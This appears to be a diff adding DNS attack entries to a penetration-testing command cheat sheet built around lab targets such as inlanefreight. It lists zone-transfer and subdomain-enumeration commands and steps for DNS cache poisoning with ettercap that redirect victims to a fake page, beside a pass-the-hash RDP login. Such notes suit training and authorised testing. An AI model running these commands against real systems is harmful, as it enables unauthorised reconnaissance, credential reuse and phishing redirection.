@@ -1446,3 +1446,57 @@ xfreerdp /v:<targetIP> /u:<user> /pth:<hash_300FF5E89EF33F83A8146C10F5AB9BB9>
 ```
 sudo nmap -sn <IP.0.0>/16  
 ```
+
+## attacking common services - dns - nmap scan
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+nmap -p53 -Pn -sV -sC <targetIP>
+```
+
+## attacking common services - dns - DNS zone transfer
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+dig AXFR @<ns1.inlanefreight.htb> <domain>
+```
+
+## attacking common services - dns - fierce (enumerate all DNS servers of the root domain and scan for a DNS zone transfer)
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+fierce --domain <domain>
+```
+
+## attacking common services - dns - subdomain enumeration subfinder
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+subfinder -d <domain> -v
+```
+
+## attacking common services - dns - subdomain enumeration subbrute
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+echo "<ns1.inlanefreight.com>" > ./resolvers.txt
+subbrute <domain> -s ./names.txt -r ./resolvers.txt
+```
+
+## attacking common services - dns - host
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+host <sub.domain.com>
+```
+
+## attacking common services - dns - local - DNS cache poisoning Step 1 
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+sudo bash -c 'echo -e "<*.domain.com>  A  <ip>" >> /etc/ettercap/etter.dns'
+```
+
+## attacking common services - dns - local - DNS cache poisoning ettercap Step 2
+#plateform/linux #target/remote #port/ #protocol/ #cat/ATTACK/
+```
+1. start ettercap
+2. Hosts > Scan for Hosts
+3. add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.
+4. Activate dns_spoof attack by navigating to Plugins > Manage Plugins
+5. After a successful DNS spoof attack, if a victim user coming from the target machine 192.168.152.129 visits the inlanefreight.com domain on a web browser, they will be redirected to a Fake page that is hosted on IP address 192.168.225.110
+6. In addition, a ping coming from the target IP address 192.168.152.129 to inlanefreight.com should be resolved to 192.168.225.110 as well
+```
